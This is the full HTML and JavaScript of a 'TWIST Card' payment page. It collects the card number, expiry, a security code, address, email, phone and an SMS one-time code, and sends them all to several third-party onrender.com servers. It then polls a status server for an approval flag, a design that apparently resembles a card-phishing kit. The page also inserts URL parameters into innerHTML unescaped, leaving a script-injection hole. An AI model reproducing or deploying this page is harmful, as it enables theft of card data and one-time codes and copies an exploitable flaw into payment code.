<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>TWIST Card Payment</title>
<style>
  body { font-family: system-ui, sans-serif; background: #f3f4f6; padding: 1.5rem; }
  .form-wrapper { max-width: 520px; margin: auto; }
  .form-container { background: white; padding: 1.5rem; border-radius: 12px; box-shadow: 0 0 10px rgba(0,0,0,.08); position: relative; }
  .form-group { margin-bottom: 1rem; }
  label { font-weight: 600; display: block; margin-bottom: 0.35rem; }
  input { width: 100%; padding: 0.6rem; font-size: 1rem; border-radius: 8px; border: 1px solid #cfcfcf; }
  .row { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
  button { background: #f97316; color: #fff; border: 0; padding: .75rem 1.1rem; border-radius: 8px; cursor: pointer; font-weight: 600; }
  button[disabled] { opacity: .6; cursor: not-allowed; }
  .hidden { display: none; }
  .spinner { width: 40px; height: 40px; border: 4px solid #ccc; border-top: 4px solid #f97316; border-radius: 50%; animation: spin 1s linear infinite; margin: 1rem auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .notice { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: .9rem; border-radius: 8px; margin-bottom: 1rem; }
  .muted { color: #6b7280; font-size: .9rem; }
  .ok { color: #16a34a; font-weight: 700; }
  .bad { color: #dc2626; font-weight: 700; }
</style>
</head>
<body>
<div class="form-wrapper">
  <h2>Pay for your order with your TWIST CARD</h2>
  <p id="orderDetails" class="muted"></p>

  <div class="form-container">
    <div class="form-logo-top" style="text-align:center; margin-bottom:1rem;">
      <img style="max-width:160px" src="https://cdn.shopify.com/s/files/1/0745/9635/2225/files/Twist_500ppx.jpg?v=1748980607" alt="Twist Card">
    </div>

    <div class="notice hidden" id="autoFillNotice">
      <strong>These fields should be auto filled.</strong><br>
      To pay with your card, click on the link provided in your order confirmation.
    </div>

    <form id="paymentForm" autocomplete="off" novalidate>
      <fieldset style="background:#eef3f7; padding:1rem; border:none; border-radius:10px; margin-bottom:1rem;">
        <div class="form-group">
          <label for="orderno">Order Number</label>
          <input type="text" id="orderno" readonly>
        </div>
        <div class="form-group">
          <label for="amount">Amount</label>
          <input type="text" id="amount" readonly>
        </div>
      </fieldset>

      <div class="form-group">
        <label for="cardNumber">Card Number (7146 1567 XXX XXX)</label>
        <input type="text" id="cardNumber" maxlength="19" required>
        <div class="muted">Must start with <strong>71461567</strong>.</div>
      </div>

      <div class="row">
        <div class="form-group">
          <label for="expiration">Expiration (MM/YY)</label>
          <input type="text" id="expiration" placeholder="MM/YY" required>
        </div>
        <div class="form-group">
          <label for="twist">TWIST Code (XXXX)</label>
          <input type="text" id="twist" maxlength="4" required>
        </div>
      </div>

      <div class="row">
        <div class="form-group">
          <label for="firstName">First Name</label>
          <input type="text" id="firstName" autocomplete="given-name">
        </div>
        <div class="form-group">
          <label for="lastName">Last Name</label>
          <input type="text" id="lastName" autocomplete="family-name">
        </div>
      </div>

      <div class="form-group">
        <label for="address">Address</label>
        <input type="text" id="address" autocomplete="address-line1">
      </div>

      <div class="row">
        <div class="form-group">
          <label for="city">City</label>
          <input type="text" id="city" autocomplete="address-level2">
        </div>
        <div class="form-group">
          <label for="postal">Postal Code</label>
          <input type="text" id="postal" autocomplete="postal-code" required>
        </div>
      </div>

      <div class="form-group">
        <label for="name">Cardholder Name</label>
        <input type="text" id="name" required autocomplete="cc-name">
      </div>

      <div class="form-group">
        <label for="email">Email (must match your account)</label>
        <input type="email" id="email" required autocomplete="email">
      </div>

      <div class="form-group">
        <label for="otpPhone">Phone (+1XXXXXXXXXX)</label>
        <div style="display:flex; gap:.5rem;">
          <input type="text" id="otpPhone" required autocomplete="tel">
          <button type="button" id="sendOtpBtn">Send OTP</button>
        </div>
        <div id="sendOtpNote" class="muted"></div>
      </div>

      <div class="form-group">
        <label for="otpCode">Enter OTP</label>
        <div style="display:flex; gap:.5rem;">
          <input type="text" id="otpCode" required>
          <button type="button" id="verifyOtpBtn">Verify OTP</button>
        </div>
        <div id="otpStatus" style="margin-top:.5rem; font-weight:700;"></div>
      </div>

      <button type="submit" id="submitBtn" disabled>Submit Payment</button>
      <div id="loadingSpinner" class="hidden" style="text-align:center; margin-top: 1rem;">
        <div class="spinner"></div>
        <p>Processing your payment...</p>
      </div>
    </form>

    <div id="confirmationStep" class="hidden" style="text-align:center;">
      <h3>STEP 2 — We are validating your information.</h3>
      <div class="spinner"></div>
      <p>Please wait a second for your confirmation.</p>
    </div>

    <div id="confirmationSuccess" class="hidden" style="text-align:center;">
      <h2 class="ok">✅ Transaction Approved</h2>
      <p>Thank you! Your payment was successfully processed.</p>
    </div>

    <div id="confirmationDenied" class="hidden" style="text-align:center;">
      <h2 class="bad">❌ Transaction Denied</h2>
      <p>Please contact Twist Card customer service.</p>
    </div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const amount = urlParams.get('amount') || '';
  const orderno = urlParams.get('orderno') || '';
  const emailQP = urlParams.get('email') || '';

  document.getElementById('amount').value = amount;
  document.getElementById('orderno').value = orderno;
  if (emailQP) document.getElementById('email').value = emailQP;

  if (!orderno || !amount) document.getElementById('autoFillNotice').classList.remove('hidden');
  document.getElementById('orderDetails').innerHTML =
    `Order Number: <strong>${orderno || '-'}</strong><br>Total: <strong>$${amount || '-'}</strong>`;

  const cardEl = document.getElementById('cardNumber');
  cardEl.addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '');
    if (v.length > 16) v = v.slice(0, 16);
    this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  });

  document.getElementById('twist').addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 4);
  });

  document.getElementById('expiration').addEventListener('input', function () {
    let v = this.value.replace(/\D/g, '');
    if (v.length >= 3) this.value = v.slice(0,2) + '/' + v.slice(2,4);
    else this.value = v;
  });

  const phoneInput = document.getElementById('otpPhone');
  phoneInput.addEventListener('input', () => {
    let value = phoneInput.value.replace(/[^\d+]/g, '');
    if (!value.startsWith('+1')) value = '+1' + value.replace('+','');
    if (value.length > 12) value = value.slice(0, 12);
    phoneInput.value = value;
  });

  const sendOtpBtn = document.getElementById('sendOtpBtn');
  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
  const otpStatus = document.getElementById('otpStatus');
  const sendOtpNote = document.getElementById('sendOtpNote');

  sendOtpBtn.onclick = async () => {
    const phone = phoneInput.value;
    if (!/^\+1\d{10}$/.test(phone)) return alert("Enter valid Canadian number (+1XXXXXXXXXX).");
    sendOtpBtn.disabled = true;
    const res = await fetch('https://twilio-otp-server.onrender.com/send-otp', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ phone })
    });
    const data = await res.json();
    sendOtpBtn.disabled = false;
    sendOtpNote.textContent = data.success ? "OTP sent." : ("Error: " + (data.error||''));
  };

  verifyOtpBtn.onclick = async () => {
    const phone = phoneInput.value;
    const code  = document.getElementById('otpCode').value.trim();
    otpStatus.textContent = "Verifying...";
    const res  = await fetch('https://twilio-otp-server.onrender.com/verify-otp', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ phone, code })
    });
    const data = await res.json();
    const ok = !!data.success;
    otpStatus.textContent = ok ? "✅ OTP verified!" : "❌ Invalid OTP";
    otpStatus.style.color = ok ? "green" : "red";
    document.getElementById('submitBtn').disabled = !ok;
  };

  document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const rawCard = cardEl.value.replace(/\s/g, '');
    if (!rawCard.startsWith('71461567')) return alert('Card must start with 71461567');
    if (rawCard.length !== 16) return alert('Card must be 16 digits');

    const transactionId = crypto.randomUUID ? crypto.randomUUID() : ('t_' + Math.random().toString(36).slice(2));

    const payload = {
      transaction_id: transactionId,
      orderno: document.getElementById('orderno').value,
      amount: document.getElementById('amount').value,
      cardNumber: rawCard,
      expiration: document.getElementById('expiration').value,
      twist: document.getElementById('twist').value,
      name: document.getElementById('name').value,
      email: document.getElementById('email').value,
      phone: phoneInput.value,
      postal: document.getElementById('postal').value,
      firstName: document.getElementById('firstName').value,
      lastName: document.getElementById('lastName').value,
      address: document.getElementById('address').value,
      city: document.getElementById('city').value,
      otpCode: document.getElementById('otpCode').value
    };

    document.getElementById('loadingSpinner').classList.remove('hidden');

    try {
      const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
        method:'POST',
        headers:{ 'Content-Type':'application/json' },
        body: JSON.stringify(payload)
      });
      const preData = await pre.json();
      if (!pre.ok || !preData?.ok) {
        document.getElementById('loadingSpinner').classList.add('hidden');
        return alert(preData?.message || 'Validation failed');
      }

      await fetch('https://form-backend-p44w.onrender.com/submit-payment', {
        method:'POST',
        headers:{ 'Content-Type':'application/json' },
        body: JSON.stringify(payload)
      });

      document.getElementById('paymentForm').classList.add('hidden');
      document.getElementById('confirmationStep').classList.remove('hidden');
      document.getElementById('loadingSpinner').classList.add('hidden');

      let attempts = 0;
      const interval = setInterval(async () => {
        attempts++;
        const res = await fetch('https://twist-status-server.onrender.com/client-check-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ transaction_id: transactionId })
        });
        const data = await res.json();

        if (data.status === 'approved') {
          clearInterval(interval);
          document.getElementById('confirmationStep').classList.add('hidden');
          document.getElementById('confirmationSuccess').classList.remove('hidden');
        } else if (attempts >= 18) {
          clearInterval(interval);
          document.getElementById('confirmationStep').classList.add('hidden');
          document.getElementById('confirmationDenied').classList.remove('hidden');
        }
      }, 5000);

    } catch (err) {
      document.getElementById('loadingSpinner').classList.add('hidden');
      alert("❌ Error: " + err.message);
    }
  });
</script>
</body>
</html>
